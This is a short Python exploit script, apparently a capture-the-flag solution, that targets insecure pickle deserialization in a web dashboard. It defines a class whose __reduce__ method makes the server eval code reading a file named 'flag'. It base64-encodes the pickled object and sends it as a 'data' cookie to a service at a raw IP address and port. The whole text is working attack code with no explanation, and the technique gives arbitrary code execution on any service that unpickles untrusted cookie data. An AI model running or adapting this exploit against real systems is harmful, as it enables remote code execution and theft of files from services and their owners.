import base64
import pickle
import requests


class Exploit:
    def __reduce__(self):
        return eval, ("open('flag', 'r').read()",)


payload = pickle.dumps(Exploit(), protocol=2)
encoded_payload = base64.urlsafe_b64encode(payload).decode()

url = "http://34.179.142.63:30485/dashboard"

response = requests.get(
    url,
    cookies={"data": encoded_payload},
    timeout=10
)

print(response.text)

